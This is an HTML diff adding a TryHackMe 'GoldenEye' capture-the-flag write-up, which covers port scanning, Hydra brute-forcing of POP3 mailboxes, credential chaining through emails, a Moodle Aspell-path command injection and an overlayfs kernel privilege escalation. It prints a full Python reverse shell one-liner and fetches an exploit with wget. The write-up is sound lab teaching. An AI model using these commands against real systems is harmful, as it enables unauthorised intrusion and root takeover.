@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GoldenEye | JackHacksStuff</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body class="room-medium">
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="credentials"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="pivot"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="exploit"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="privesc"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="flags"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="takeaways"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Medium</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge medium">Medium</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · credential harvesting · web exploitation · linux privesc</div>
+    <h1 class="wu-title">GoldenEye</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-08-14</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent medium">Medium</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">2</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">hydra</span>
+    <span class="tool-tag">netcat</span>
+    <span class="tool-tag">python</span>
+    <span class="tool-tag">strings</span>
+    <span class="tool-tag">base64</span>
+    <span class="tool-tag">wget</span>
+    <span class="tool-tag">gcc</span>
+    <span class="tool-tag">moodle</span>
+  </div>
+
+  <div class="wu-body">
+
+    <p><em>All flags, passwords, and hashes have been redacted per TryHackMe's write-up policy. This write-up focuses on methodology and techniques.</em></p>
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>GoldenEye</strong> is a TryHackMe room that simulates a multi-service corporate network. The room is themed around the classic James Bond film and follows a realistic penetration testing methodology.</p>
+    <p>The attack chain includes:</p>
+    <ul>
+      <li>Port scanning and service enumeration</li>
+      <li>Source code analysis to discover default credentials</li>
+      <li>Password brute-forcing against POP3 services</li>
+      <li>Credential harvesting through email enumeration</li>
+      <li>DNS host configuration for virtual host access</li>
+      <li>Moodle CMS exploitation via a spell checker plugin</li>
+      <li>Reverse shell acquisition through command injection</li>
+      <li>Linux privilege escalation using the overlayfs kernel exploit</li>
+    </ul>
+    <p><a href="https://tryhackme.com/room/goldeneye" target="_blank">View room on TryHackMe →</a></p>
+
+    <h2 id="recon">// Phase 1: Reconnaissance</h2>
+
+    <p>We begin with an Nmap full port scan to identify open services:</p>
+
+    <pre>nmap -p- -sV -sC -T4 &lt;target_ip&gt;</pre>
+
+    <p>The scan reveals four open ports:</p>
+
+    <pre>PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          Postfix smtpd
+80/tcp    open  http          Apache httpd 2.4.7
+55006/tcp open  ssl/pop3      Dovecot pop3d
+55007/tcp open  pop3          Dovecot pop3d</pre>
+
+    <p>Port 80 hosts a website for <em>Severnaya Auxiliary Control Station</em>. The page includes a login link at <code>/sev-home/</code> and references a JavaScript file called <code>terminal.js</code>.</p>
+
+    <p>Viewing the source of <code>terminal.js</code> reveals an interesting comment:</p>
+
+    <pre>//Boris, make sure you update your default password.</pre>
+
+    <p>Immediately below, an HTML-encoded string gives us Boris's default password. Decoding it reveals a weak credential that works on the <code>/sev-home/</code> web login.</p>
+
+    <div class="note">
+      <strong>Credential Discovery:</strong> The username is <code>boris</code>. The password was found in <code>terminal.js</code> as an HTML-encoded string.
+    </div>
+
+    <h2 id="credentials">// Phase 2: Credential Harvesting</h2>
+
+    <p>We attempted to reuse the web credentials on the POP3 service on port 55007, but it failed. Using Hydra with the <code>fasttrack.txt</code> wordlist, we brute-forced the POP3 password.</p>
+
+    <pre>hydra -l boris -P /usr/share/wordlists/fasttrack.txt &lt;target_ip&gt; -s 55007 pop3 -v</pre>
+
+    <p>Hydra quickly found the password, granting us access to Boris's mailbox.</p>
+
+    <pre>nc -nv &lt;target_ip&gt; 55007
+USER boris
+PASS [REDACTED]
+LIST
+RETR 2</pre>
+
+    <p>Boris's emails revealed a conversation mentioning <strong>Natalya</strong>, who could break his codes. We repeated the brute-force process for Natalya, gaining access to her mailbox.</p>
+
+    <p>Natalya's emails contained credentials for <strong>Xenia</strong>, and Xenia's emails revealed the next user, <strong>Doak</strong>. This pattern continued through the credential chain:</p>
+
+    <ul class="credential-chain">
+      <li><strong>boris</strong> → Web login (source code) → POP3 (Hydra)</li>
+      <li><strong>natalya</strong> → POP3 (found in Boris's email)</li>
+      <li><strong>xenia</strong> → POP3 (found in Natalya's email)</li>
+      <li><strong>doak</strong> → POP3 (Hydra) → dr_doak (found in Doak's email)</li>
+      <li><strong>dr_doak</strong> → Moodle web application</li>
+    </ul>
+
+    <figure class="screenshot">
+      <img src="../images/goldeneye/xenia-messages-doak.png" alt="Xenia's Moodle inbox showing a message from Dr Doak" />
+      <figcaption>Figure 1: Xenia's inbox contains a message from Dr Doak, revealing the next set of credentials.</figcaption>
+    </figure>
+
+    <div class="takeaway">
+      <strong>Pivoting through email is powerful.</strong> Each user's mailbox contained credentials for the next user, demonstrating the risk of password reuse and insecure communication.
+    </div>
+
+    <h2 id="pivot">// Phase 3: Web Pivot & Admin Discovery</h2>
+
+    <p>Before accessing the Moodle site, we added the virtual host to <code>/etc/hosts</code>:</p>
+
+    <pre>echo "&lt;target_ip&gt; severnaya-station.com" &gt;&gt; /etc/hosts</pre>
+
+    <p>We navigated to <code>http://severnaya-station.com/gnocertdir</code> and logged in as <code>dr_doak</code>.</p>
+
+    <figure class="screenshot">
+      <img src="../images/goldeneye/doak-private-files.png" alt="Doak's private files showing s3cret.txt" />
+      <figcaption>Figure 2: Doak's private files contain a suspicious file named <code>s3cret.txt</code>.</figcaption>
+    </figure>
+
+    <p>The <code>s3cret.txt</code> file contained a message pointing to an image:</p>
+
+    <pre>/dir007key/for-007.jpg</pre>
+
+    <p>We downloaded the image and used <code>strings</code> to inspect its contents:</p>
+
+    <pre>strings for-007.jpg | head -5
+JFIF
+Exif
+eFdpbnRlcjE5OTV4IQ==
+GoldenEye
+linux</pre>
+
+    <p>The Base64-encoded string decoded to the admin password:</p>
+
+    <pre>echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
+[REDACTED]</pre>
+
+    <div class="note">
+      <strong>Steganography:</strong> The admin password was hidden in the image's EXIF data using Base64 encoding. This allowed the author to bypass text-based scanning.
+    </div>
+
+    <h2 id="exploit">// Phase 4: Reverse Shell via Moodle RCE</h2>
+
+    <p>Using the admin credentials found via steganography, we logged into Moodle and navigated to the system paths configuration:</p>
+
+    <pre>Site Administration → Server → System paths</pre>
+
+    <p>We found the <strong>Path to aspell</strong> field and replaced it with a Python reverse shell command:</p>
+
+    <div class="payload-box">
+      <pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;your_ip&gt;",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+    </div>
+
+    <figure class="screenshot">
+      <img src="../images/goldeneye/aspell-rce.png" alt="Moodle System Paths page showing the Aspell path replaced with a reverse shell" />
+      <figcaption>Figure 3: The Aspell path is replaced with a Python reverse shell command.</figcaption>
+    </figure>
+
+    <p>We set up a listener on our attack machine:</p>
+
+    <pre>nc -lvnp 4444</pre>
+
+    <p>To trigger the command, we created a new blog entry and clicked the spell check button, which calls the Aspell binary:</p>
+
+    <figure class="screenshot">
+      <img src="../images/goldeneye/blog-editor.png" alt="Moodle blog editor with spell check button highlighted" />
+      <figcaption>Figure 4: Clicking the spell check button executes the injected reverse shell.</figcaption>
+    </figure>
+
+    <p>This gave us a foothold as <code>www-data</code>:</p>
+
+    <pre>Connection received on &lt;your_ip&gt; 4444
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data</pre>
+
+    <div class="takeaway">
+      <strong>Moodle RCE via Aspell:</strong> The spell checker plugin executes the <code>aspell</code> binary. By replacing its path with a command, we achieved remote code execution.
+    </div>
+
+    <h2 id="privesc">// Phase 5: Privilege Escalation</h2>
+
+    <p>We checked the kernel version and confirmed it was vulnerable to the <strong>Overlayfs</strong> exploit (CVE-2015-1328):</p>
+
+    <pre>uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP ... x86_64</pre>
+
+    <p>We downloaded the exploit source from Exploit-DB and compiled it on the target:</p>
+
+    <pre>wget http://&lt;your_ip&gt;:1337/37292.c -O ofs_exploit.c</pre>
+
+    <p>However, the exploit calls <code>gcc</code> at runtime to create a shared library. The target only had <code>cc</code> installed. We created a symlink to bypass this limitation:</p>
+
+    <pre>ln -s /usr/bin/cc /tmp/gcc
+export PATH=/tmp:$PATH</pre>
+
+    <p>We ran the exploit and successfully escalated to root:</p>
+
+    <pre>./ofs_exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami
+root</pre>
+
+    <div class="takeaway">
+      <strong>Adaptability is critical.</strong> When the exploit expected <code>gcc</code> and only <code>cc</code> was available, a simple symlink bypassed the limitation. This kind of creative thinking separates good hackers from great ones.
+    </div>
+
+    <h2 id="flags">// Phase 6: Flags</h2>
+
+    <p>With root access, we located and retrieved the flags:</p>
+
+    <pre># Find the root flag
+cat /root/.flag.txt
+Alec told me to place the codes here:
+
+[REDACTED]
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">root.txt</span>
+      <span class="flag-value">[REDACTED per THM policy]</span>
+    </div>
+
+    <p><em>Flags have been redacted in accordance with TryHackMe's write-up policy. The root flag is located at <code>/root/.flag.txt</code>.</em></p>
+
+    <h2 id="takeaways">// Key Takeaways</h2>
+
+    <div class="takeaway">
+      <strong>Multi-service enumeration is essential.</strong> The POP3 server on a non-standard port contained the majority of the credentials needed to progress.
+    </div>
+
+    <div class="takeaway">
+      <strong>Email is a goldmine.</strong> Users frequently share credentials and sensitive information via email.
+    </div>
+
+    <div class="takeaway">
+      <strong>DNS configuration matters.</strong> The virtual host wasn't reachable until we added it to <code>/etc/hosts</code>.
+    </div>
+
+    <div class="takeaway">
+      <strong>Hidden data is everywhere.</strong> The admin password was hidden in an image's EXIF data — always check <code>strings</code> on suspicious files.
+    </div>
+
+    <div class="takeaway">
+      <strong>Kernel vulnerabilities remain effective.</strong> Even in 2026, old Linux kernels with known exploits can be a path to root.
+    </div>
+
+    <div class="takeaway">
+      <strong>Creative problem-solving wins.</strong> The symlink trick to bypass the missing <code>gcc</code> dependency shows adaptability.
+    </div>
+
+  </div>
+
+  <div class="wu-footer">
+    <a href="gamingserver.html" class="footer-nav-link prev">
+      <span class="footer-nav-label">← Previous</span>
+      <span class="footer-nav-title">GamingServer</span>
+    </a>
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="lofi.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">Lo-Fi</span>
+    </a>
+  </div>
+
+</main>
+
+<script src="../js/script.js"></script>
+
+</body>
+</html>
